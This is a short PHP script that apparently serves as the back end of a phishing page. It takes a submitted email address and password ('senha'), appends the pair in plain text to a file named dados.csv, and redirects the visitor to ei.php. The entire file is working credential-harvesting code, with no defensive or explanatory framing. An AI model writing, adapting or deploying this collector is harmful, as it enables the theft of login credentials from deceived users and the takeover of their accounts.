<?php

$a = $_POST['email'];
$b = $_POST['senha'];


$c = $a."-".$b;
$d = file('dados.csv');
$d[] = $c."\n";
$d_string = implode('', $d);

file_put_contents('dados.csv', $d_string);
header('location:ei.php');
?>